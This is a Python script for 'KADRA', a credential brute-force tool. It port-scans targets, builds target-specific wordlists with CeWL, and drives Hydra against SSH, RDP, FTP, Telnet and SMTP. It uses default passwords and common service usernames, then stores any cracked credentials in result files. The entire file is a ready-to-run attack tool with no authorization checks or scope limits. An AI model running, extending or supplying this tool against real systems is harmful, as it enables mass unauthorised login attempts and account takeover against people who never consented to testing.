#!/usr/bin/env python3

"""
██╗  ██╗ █████╗ ██████╗ ██████╗  █████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╔╝ ███████║██║  ██║██████╔╝███████║
██╔═██╗ ██╔══██║██║  ██║██╔══██╗██╔══██║
██║  ██╗██║  ██║██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝

KADRA - Credential Bruteforce Automation Tool
Version 1.1
Author Conscience Ekhomwandolor

Targeted brute force against SMTP, RDP, FTP, Telnet, SSH
with intelligent wordlist management and Hydra integration.
"""

import os
import sys
import time
import json
import socket
import subprocess
import threading
import ipaddress
import argparse
import logging
import hashlib
import re
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================
# CONFIGURATION
# ============================================
class Config:
    """KADRA Configuration"""
    
    # Service ports and Hydra modules
    SERVICES = {
        'ssh': {
            'port': 22,
            'hydra_module': 'ssh',
            'protocol': 'tcp',
            'timeout': 30,
            'max_attempts': 3
        },
        'rdp': {
            'port': 3389,
            'hydra_module': 'rdp',
            'protocol': 'tcp',
            'timeout': 45,
            'max_attempts': 2
        },
        'ftp': {
            'port': 21,
            'hydra_module': 'ftp',
            'protocol': 'tcp',
            'timeout': 25,
            'max_attempts': 3
        },
        'telnet': {
            'port': 23,
            'hydra_module': 'telnet',
            'protocol': 'tcp',
            'timeout': 20,
            'max_attempts': 3
        },
        'smtp': {
            'port': 25,
            'hydra_module': 'smtp',
            'protocol': 'tcp',
            'timeout': 30,
            'max_attempts': 2
        }
    }
    
    # Performance settings
    MAX_THREADS = 3
    SCAN_TIMEOUT = 10
    BRUTE_TIMEOUT = 300
    
    # Paths
    BASE_DIR = Path(__file__).parent.absolute()
    TARGETS_FILE = BASE_DIR / "targets.txt"
    PASSLIST_FILE = BASE_DIR / "passlist.txt"
    WORDLIST_DIR = BASE_DIR / "wordlists"
    RESULTS_DIR = BASE_DIR / "results"
    LOG_FILE = BASE_DIR / "kadra.log"
    
    # Hydra settings
    HYDRA_RATE_LIMIT = 5  # Attempts per second
    HYDRA_TASKS = 16      # Parallel tasks
    
    # CeWL settings (for wordlist generation)
    CEWL_DEPTH = 2
    CEWL_MIN_WORD_LEN = 3
    CEWL_OPTIONS = "--with-numbers --lowercase"

# ============================================
# LOGGING SETUP
# ============================================
def setup_logging(verbose=False):
    """Configure logging"""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(Config.LOG_FILE),
            logging.StreamHandler()
        ]
    )
    
    # Suppress Hydra's verbose output
    logging.getLogger('subprocess').setLevel(logging.WARNING)
    
    return logging.getLogger(__name__)

# ============================================
# BANNER
# ============================================
def print_banner():
    """Print KADRA banner"""
    banner = """
██╗  ██╗ █████╗ ██████╗ ██████╗  █████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╔╝ ███████║██║  ██║██████╔╝███████║
██╔═██╗ ██╔══██║██║  ██║██╔══██╗██╔══██║
██║  ██╗██║  ██║██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝

KADRA - Credential Bruteforce Automation v1.0
Targeting SSH, RDP, FTP, Telnet, SMTP
    """
    print(banner)

# ============================================
# TARGET MANAGEMENT
# ============================================
class TargetManager:
    """Handle target loading and validation"""
    
    @staticmethod
    def load_targets(filename: str = None) -> List[str]:
        """Load targets from file"""
        if filename is None:
            filename = Config.TARGETS_FILE
        
        targets = []
        
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if TargetManager.validate_target(line):
                            targets.append(line)
                        else:
                            logging.warning(f"Invalid target format: {line}")
            
            logging.info(f"Loaded {len(targets)} valid targets")
            return targets
            
        except FileNotFoundError:
            logging.error(f"Targets file not found: {filename}")
            return []
    
    @staticmethod
    def validate_target(target: str) -> bool:
        """Validate target format"""
        try:
            # Check if it's an IP address
            ipaddress.ip_address(target)
            return True
        except ValueError:
            # Check if it's a valid domain
            if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target):
                return True
            # Check if it's a URL
            if re.match(r'^https?://', target):
                # Extract domain from URL
                import urllib.parse
                parsed = urllib.parse.urlparse(target)
                return bool(parsed.netloc)
        return False
    
    @staticmethod
    def resolve_target(target: str) -> str:
        """Resolve domain to IP address"""
        try:
            # If it's already an IP, return it
            ipaddress.ip_address(target)
            return target
        except ValueError:
            # Try to resolve domain
            try:
                ip = socket.gethostbyname(target)
                logging.debug(f"Resolved {target} -> {ip}")
                return ip
            except socket.gaierror:
                logging.error(f"Could not resolve {target}")
                return target

# ============================================
# WORDLIST GENERATOR (CeWL)
# ============================================
class WordlistGenerator:
    """Generate wordlists from target URLs using CeWL"""
    
    def __init__(self):
        self.cewl_path = self._find_cewl()
    
    def _find_cewl(self) -> str:
        """Find CeWL installation"""
        locations = [
            '/usr/bin/cewl',
            '/usr/local/bin/cewl',
            '/opt/cewl/cewl',
            '/usr/share/cewl/cewl'
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                return loc
        
        # Try to find in PATH
        try:
            result = subprocess.run(['which', 'cewl'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        logging.error("CeWL not found! Wordlist generation disabled.")
        return None
    
    def generate_from_url(self, url: str, target_name: str) -> Optional[str]:
        """Generate wordlist from URL using CeWL"""
        if not self.cewl_path:
            return None
        
        # Ensure wordlist directory exists
        Config.WORDLIST_DIR.mkdir(exist_ok=True)
        
        wordlist_file = Config.WORDLIST_DIR / f"{target_name}.txt"
        
        # Build CeWL command
        cmd = [
            self.cewl_path,
            url,
            '-d', str(Config.CEWL_DEPTH),
            '-m', str(Config.CEWL_MIN_WORD_LEN),
            '-w', str(wordlist_file)
        ]
        
        # Add options
        if Config.CEWL_OPTIONS:
            cmd.extend(Config.CEWL_OPTIONS.split())
        
        logging.info(f"Generating wordlist for {target_name} from {url}")
        
        try:
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=180  # 3 minute timeout
            )
            
            if process.returncode == 0 and wordlist_file.exists():
                # Count lines in generated wordlist
                with open(wordlist_file, 'r') as f:
                    line_count = sum(1 for _ in f)
                
                logging.info(f"Generated wordlist with {line_count} words for {target_name}")
                return str(wordlist_file)
            else:
                logging.error(f"CeWL failed: {process.stderr}")
                return None
                
        except subprocess.TimeoutExpired:
            logging.error(f"CeWL timed out for {target_name}")
            return None
        except Exception as e:
            logging.error(f"CeWL error: {e}")
            return None
    
    def generate_for_targets(self, targets: List[str]) -> Dict[str, str]:
        """Generate wordlists for all targets"""
        wordlists = {}
        
        for target in targets:
            # Only generate for URLs
            if re.match(r'^https?://', target):
                # Extract filename-safe target name
                target_name = target.replace('://', '_').replace('/', '_').replace('.', '_')
                if len(target_name) > 50:
                    target_name = target_name[:50]
                
                wordlist = self.generate_from_url(target, target_name)
                if wordlist:
                    wordlists[target] = wordlist
        
        return wordlists

# ============================================
# PORT SCANNER
# ============================================
class PortScanner:
    """Scan for specific service ports"""
    
    def __init__(self):
        self.services = Config.SERVICES
    
    def scan_target(self, target_ip: str) -> Dict[str, bool]:
        """Scan target for open service ports"""
        open_services = {}
        
        logging.info(f"Scanning {target_ip} for services...")
        
        for service_name, service_info in self.services.items():
            port = service_info['port']
            
            if self.check_port(target_ip, port):
                open_services[service_name] = True
                logging.info(f"  [+] {service_name.upper()} open on {target_ip}:{port}")
            else:
                open_services[service_name] = False
        
        return open_services
    
    def check_port(self, host: str, port: int) -> bool:
        """Check if a specific port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(Config.SCAN_TIMEOUT)
            
            result = sock.connect_ex((host, port))
            sock.close()
            
            return result == 0
            
        except Exception as e:
            logging.debug(f"Port check error {host}:{port}: {e}")
            return False
    
    def scan_targets(self, targets: List[str]) -> Dict[str, Dict[str, bool]]:
        """Scan multiple targets for open services"""
        results = {}
        
        with ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
            future_to_target = {
                executor.submit(self.scan_target, target): target 
                for target in targets
            }
            
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    results[target] = future.result()
                except Exception as e:
                    logging.error(f"Scan failed for {target}: {e}")
                    results[target] = {}
        
        return results

# ============================================
# PASSWORD LIST MANAGER
# ============================================
class PasswordManager:
    """Manage password lists"""
    
    @staticmethod
    def load_passlist(filename: str = None) -> List[str]:
        """Load password list from file"""
        if filename is None:
            filename = Config.PASSLIST_FILE
        
        passwords = []
        
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        passwords.append(line)
            
            logging.info(f"Loaded {len(passwords)} passwords from {filename}")
            return passwords
            
        except FileNotFoundError:
            logging.error(f"Password file not found: {filename}")
            
            # Create default passlist if it doesn't exist
            default_passwords = [
                'admin', 'password', '123456', 'password123',
                'administrator', 'root', 'toor', 'admin123',
                'test', 'guest', 'qwerty', 'letmein'
            ]
            
            with open(filename, 'w') as f:
                for pwd in default_passwords:
                    f.write(pwd + '\n')
            
            logging.info(f"Created default password list with {len(default_passwords)} entries")
            return default_passwords
    
    @staticmethod
    def load_wordlist(filename: str) -> List[str]:
        """Load wordlist from file"""
        if not os.path.exists(filename):
            return []
        
        words = []
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        words.append(line)
            
            logging.info(f"Loaded {len(words)} words from {filename}")
            return words
            
        except Exception as e:
            logging.error(f"Failed to load wordlist {filename}: {e}")
            return []

# ============================================
# HYDRA BRUTEFORCE ENGINE
# ============================================
class HydraEngine:
    """Hydra wrapper for brute force attacks"""
    
    def __init__(self):
        self.hydra_path = self._find_hydra()
    
    def _find_hydra(self) -> str:
        """Find Hydra installation"""
        locations = [
            '/usr/bin/hydra',
            '/usr/local/bin/hydra',
            '/usr/share/hydra/hydra'
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                return loc
        
        # Try to find in PATH
        try:
            result = subprocess.run(['which', 'hydra'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        logging.error("Hydra not found!")
        return None
    
    def build_hydra_command(self, target_ip: str, service: str, 
                           username: str = None, password_file: str = None,
                           username_file: str = None) -> List[str]:
        """Build Hydra command for specific service"""
        if not self.hydra_path:
            return None
        
        service_info = Config.SERVICES.get(service)
        if not service_info:
            return None
        
        cmd = [
            self.hydra_path,
            '-I',  # Skip waiting
            '-t', str(Config.HYDRA_TASKS),
            '-w', str(service_info['timeout']),
            '-f',  # Exit after first found password
            '-o', '/dev/stdout',  # Output to stdout
            '-b', 'json'  # JSON output format
        ]
        
        # Add service-specific options
        hydra_module = service_info['hydra_module']
        
        if service == 'rdp':
            cmd.extend(['-V'])  # Show attempts for RDP
        
        # Add target
        target_spec = f"{hydra_module}://{target_ip}:{service_info['port']}"
        
        # Add credentials
        if username and password_file:
            # Single username, password list
            cmd.extend(['-l', username, '-P', password_file, target_spec])
        elif username_file and password_file:
            # Username list and password list
            cmd.extend(['-L', username_file, '-P', password_file, target_spec])
        elif username:
            # Single username, single password (for testing)
            cmd.extend(['-l', username, '-p', password_file, target_spec])
        else:
            # Default to root username with password list
            cmd.extend(['-l', 'root', '-P', password_file, target_spec])
        
        return cmd
    
    def execute_attack(self, target_ip: str, service: str, 
                      password_file: str, username: str = None,
                      username_file: str = None) -> Dict:
        """Execute Hydra attack and parse results"""
        if not self.hydra_path:
            return {'error': 'Hydra not found'}
        
        cmd = self.build_hydra_command(target_ip, service, username, 
                                      password_file, username_file)
        
        if not cmd:
            return {'error': 'Could not build command'}
        
        logging.info(f"Executing Hydra against {target_ip}:{service}")
        
        try:
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=Config.BRUTE_TIMEOUT
            )
            
            result = {
                'command': ' '.join(cmd),
                'returncode': process.returncode,
                'stdout': process.stdout,
                'stderr': process.stderr,
                'success': False,
                'credentials': []
            }
            
            # Parse Hydra JSON output
            if process.stdout:
                try:
                    # Hydra outputs JSON lines, need to find the result line
                    for line in process.stdout.strip().split('\n'):
                        if line.startswith('{'):
                            data = json.loads(line)
                            if 'results' in data:
                                for res in data['results']:
                                    if 'login' in res and 'password' in res:
                                        result['credentials'].append({
                                            'username': res['login'],
                                            'password': res['password'],
                                            'service': service,
                                            'host': target_ip,
                                            'port': Config.SERVICES[service]['port']
                                        })
                                        result['success'] = True
                except json.JSONDecodeError:
                    # Try to parse traditional output
                    for line in process.stdout.split('\n'):
                        if 'login' in line.lower() and 'password' in line.lower():
                            parts = line.split()
                            if len(parts) >= 4:
                                result['credentials'].append({
                                    'username': parts[1],
                                    'password': parts[3],
                                    'service': service,
                                    'host': target_ip,
                                    'port': Config.SERVICES[service]['port']
                                })
                                result['success'] = True
            
            return result
            
        except subprocess.TimeoutExpired:
            logging.warning(f"Hydra timeout for {target_ip}:{service}")
            return {'error': 'timeout', 'success': False}
        except Exception as e:
            logging.error(f"Hydra execution error: {e}")
            return {'error': str(e), 'success': False}
    
    def test_credential(self, target_ip: str, service: str, 
                       username: str, password: str) -> bool:
        """Test a single credential quickly"""
        # Create temp file with single password
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(password + '\n')
            temp_file = f.name
        
        try:
            result = self.execute_attack(target_ip, service, temp_file, username)
            return result.get('success', False)
        finally:
            # Cleanup temp file
            try:
                os.unlink(temp_file)
            except:
                pass

# ============================================
# BRUTEFORCE ORCHESTRATOR
# ============================================
class BruteforceOrchestrator:
    """Orchestrate brute force attacks"""
    
    def __init__(self):
        self.scanner = PortScanner()
        self.hydra = HydraEngine()
        self.results = {}
        
        # Ensure results directory exists
        Config.RESULTS_DIR.mkdir(exist_ok=True)
    
    def run_against_target(self, target: str, wordlists: Dict[str, str]) -> Dict:
        """Run complete brute force against a single target"""
        target_results = {
            'target': target,
            'ip': TargetManager.resolve_target(target),
            'open_services': {},
            'credentials_found': [],
            'timestamp': datetime.now().isoformat()
        }
        
        target_ip = target_results['ip']
        
        # 1. Scan for open services
        open_services = self.scanner.scan_target(target_ip)
        target_results['open_services'] = open_services
        
        # 2. Load common password list
        common_passwords = PasswordManager.load_passlist()
        
        # 3. Load target-specific wordlist if available
        target_wordlist = wordlists.get(target)
        target_words = []
        if target_wordlist and os.path.exists(target_wordlist):
            target_words = PasswordManager.load_wordlist(target_wordlist)
        
        # 4. Attack each open service
        for service, is_open in open_services.items():
            if not is_open:
                continue
            
            logging.info(f"Attacking {service.upper()} on {target_ip}")
            
            # Try common passwords first
            creds = self.attack_service(
                target_ip, service, common_passwords, 
                use_common=True, target_name=target
            )
            
            if creds:
                target_results['credentials_found'].extend(creds)
                logging.info(f"  [+] Found {len(creds)} credential(s) with common passwords")
                continue  # Move to next service
            
            # If no success with common passwords, try target wordlist
            if target_words:
                creds = self.attack_service(
                    target_ip, service, target_words,
                    use_common=False, target_name=target
                )
                
                if creds:
                    target_results['credentials_found'].extend(creds)
                    logging.info(f"  [+] Found {len(creds)} credential(s) with target wordlist")
        
        return target_results
    
    def attack_service(self, target_ip: str, service: str, 
                      passwords: List[str], use_common: bool = True,
                      target_name: str = None) -> List[Dict]:
        """Attack a specific service with password list"""
        if not passwords:
            return []
        
        # Create temp password file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            for pwd in passwords:
                f.write(pwd + '\n')
            temp_file = f.name
        
        try:
            # Common usernames based on service
            common_usernames = self.get_service_usernames(service)
            
            # Try each common username
            for username in common_usernames:
                result = self.hydra.execute_attack(
                    target_ip, service, temp_file, username
                )
                
                if result.get('success'):
                    # Add username to credentials
                    for cred in result['credentials']:
                        if 'username' not in cred or not cred['username']:
                            cred['username'] = username
                        cred['password_source'] = 'common' if use_common else 'target'
                    
                    return result['credentials']
            
            return []
            
        finally:
            # Cleanup temp file
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def get_service_usernames(self, service: str) -> List[str]:
        """Get common usernames for a service"""
        common = ['root', 'admin', 'administrator', 'test', 'guest', 'user']
        
        service_specific = {
            'ssh': ['root', 'ubuntu', 'debian', 'centos', 'ec2-user', 'pi'],
            'rdp': ['administrator', 'admin', 'user', 'test', 'guest'],
            'ftp': ['anonymous', 'ftp', 'admin', 'user'],
            'telnet': ['root', 'admin', 'cisco', 'admin'],
            'smtp': ['admin', 'postmaster', 'mail', 'root']
        }
        
        usernames = service_specific.get(service, common).copy()
        usernames.extend(common)  # Add generic usernames too
        
        # Remove duplicates while preserving order
        seen = set()
        unique_usernames = []
        for user in usernames:
            if user not in seen:
                seen.add(user)
                unique_usernames.append(user)
        
        return unique_usernames
    
    def run_against_targets(self, targets: List[str], wordlists: Dict[str, str]) -> Dict[str, Dict]:
        """Run brute force against multiple targets"""
        all_results = {}
        
        with ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
            future_to_target = {
                executor.submit(self.run_against_target, target, wordlists): target 
                for target in targets
            }
            
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    all_results[target] = future.result()
                    self.save_results(target, all_results[target])
                except Exception as e:
                    logging.error(f"Brute force failed for {target}: {e}")
                    all_results[target] = {'error': str(e)}
        
        return all_results
    
    def save_results(self, target: str, results: Dict):
        """Save results to file"""
        # Create filename-safe target name
        target_safe = re.sub(r'[^\w\-_. ]', '_', target)
        if len(target_safe) > 50:
            target_safe = target_safe[:50]
        
        results_file = Config.RESULTS_DIR / f"{target_safe}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        logging.info(f"Results saved to {results_file}")
        
        # Also save summary
        self.save_summary(target, results)
    
    def save_summary(self, target: str, results: Dict):
        """Save human-readable summary"""
        target_safe = re.sub(r'[^\w\-_. ]', '_', target)
        if len(target_safe) > 50:
            target_safe = target_safe[:50]
        
        summary_file = Config.RESULTS_DIR / f"{target_safe}_summary.txt"
        
        with open(summary_file, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write(f"KADRA - Credential Bruteforce Summary\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Target: {results.get('target', 'NA')}\n")
            f.write(f"IP Address: {results.get('ip', 'NA')}\n")
            f.write(f"Scan Time: {results.get('timestamp', 'NA')}\n\n")
            
            f.write("Open Services:\n")
            for service, is_open in results.get('open_services', {}).items():
                status = "OPEN" if is_open else "closed"
                f.write(f"  {service.upper():10}  {status}\n")
            
            f.write("\nCredentials Found:\n")
            creds = results.get('credentials_found', [])
            if creds:
                for i, cred in enumerate(creds, 1):
                    f.write(f"  {i}. Service: {cred.get('service', 'NA')}\n")
                    f.write(f"     Username: {cred.get('username', 'NA')}\n")
                    f.write(f"     Password: {cred.get('password', 'NA')}\n")
                    f.write(f"     Source: {cred.get('password_source', 'NA')}\n")
                    f.write(f"     Host: {cred.get('host', 'NA')}:{cred.get('port', 'NA')}\n\n")
            else:
                f.write("  No credentials found.\n")
            
            f.write("=" * 60 + "\n")
        
        logging.debug(f"Summary saved to {summary_file}")

# ============================================
# MAIN EXECUTION
# ============================================
def main():
    """Main execution function"""
    
    print_banner()
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description='KADRA - Credential Bruteforce Automation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 kadra.py                         # Run with default targets.txt
  python3 kadra.py --targets my_targets.txt
  python3 kadra.py --target 192.168.1.1   # Single target
  python3 kadra.py --no-wordlists         # Skip wordlist generation
  python3 kadra.py --verbose              # Detailed output
        '''
    )
    
    parser.add_argument('--targets', type=str, 
                       default=str(Config.TARGETS_FILE),
                       help='Targets file (default: targets.txt)')
    parser.add_argument('--target', type=str,
                       help='Single target to attack')
    parser.add_argument('--passlist', type=str,
                       default=str(Config.PASSLIST_FILE),
                       help='Password list file (default: passlist.txt)')
    parser.add_argument('--no-wordlists', action='store_true',
                       help='Skip wordlist generation')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    parser.add_argument('--threads', type=int,
                       default=Config.MAX_THREADS,
                       help=f'Maximum threads (default: {Config.MAX_THREADS})')
    
    args = parser.parse_args()
    
    # Setup logging
    logger = setup_logging(args.verbose)
    
    # Update config based on arguments
    Config.TARGETS_FILE = Path(args.targets)
    Config.PASSLIST_FILE = Path(args.passlist)
    Config.MAX_THREADS = args.threads
    
    # Load targets
    targets = []
    if args.target:
        targets.append(args.target)
    else:
        targets = TargetManager.load_targets()
    
    if not targets:
        print("[!] No valid targets found.")
        print(f"[] Create {Config.TARGETS_FILE} or use --target option")
        sys.exit(1)
    
    print(f"[] Loaded {len(targets)} target(s)")
    
    # Generate wordlists (if not disabled)
    wordlists = {}
    if not args.no_wordlists:
        print("[] Generating wordlists from URLs...")
        generator = WordlistGenerator()
        wordlists = generator.generate_for_targets(targets)
        if wordlists:
            print(f"    Generated {len(wordlists)} wordlist(s)")
    
    # Run brute force
    print("\n[] Starting credential brute force...")
    print("[] Targeting SSH, RDP, FTP, Telnet, SMTP")
    print("[] Strategy: Common passwords -> Target wordlists")
    print()
    
    orchestrator = BruteforceOrchestrator()
    results = orchestrator.run_against_targets(targets, wordlists)
    
    # Print final summary
    print("\n" + "=" * 60)
    print("KADRA - FINAL SUMMARY")
    print("=" * 60)
    
    total_creds = 0
    for target, result in results.items():
        creds = result.get('credentials_found', [])
        if creds:
            print(f"\n[+] {target}")
            for cred in creds:
                print(f"    Service: {cred.get('service')}")
                print(f"    Username: {cred.get('username')}")
                print(f"    Password: {cred.get('password')}")
                print(f"    Source: {cred.get('password_source', 'unknown')}")
                print()
            total_creds += len(creds)
        else:
            print(f"[-] {target}: No credentials found")
    
    print(f"\n[] Total credentials found: {total_creds}")
    print(f"[] Results saved in: {Config.RESULTS_DIR}")
    print(f"[] Log file: {Config.LOG_FILE}")
    print("=" * 60)

# ============================================
# QUICK SETUP SCRIPT
# ============================================
def create_setup_script():
    """Create setup script for KADRA"""
    setup_content = '''#!/bin/bash
echo "[+] Setting up KADRA..."

# Install dependencies
sudo apt update
sudo apt install -y hydra cewl python3 python3-pip

# Create necessary files
touch targets.txt passlist.txt

# Add sample content to passlist.txt
cat > passlist.txt << 'EOF'
admin
password
123456
password123
administrator
root
toor
admin123
test
guest
qwerty
letmein
EOF

# Make script executable
chmod +x kadra.py

echo "[+] Setup complete!"
echo "[] Edit targets.txt with your targets"
echo "[] Run: python3 kadra.py"
'''

    with open('setup_kadra.sh', 'w') as f:
        f.write(setup_content)
    
    os.chmod('setup_kadra.sh', 0o755)
    print("[] Created setup_kadra.sh")
    print("[] Run: sudo bash setup_kadra.sh")

# ============================================
# ENTRY POINT
# ============================================
if __name__ == "__main__":
    # Create directories if they don't exist
    Config.WORDLIST_DIR.mkdir(exist_ok=True)
    Config.RESULTS_DIR.mkdir(exist_ok=True)
    
    # Check for setup
    if not Config.PASSLIST_FILE.exists():
        print("[!] Password list not found. Creating default...")
        PasswordManager.load_passlist()  # This creates default
    
    # Run main
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[] KADRA interrupted by user")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)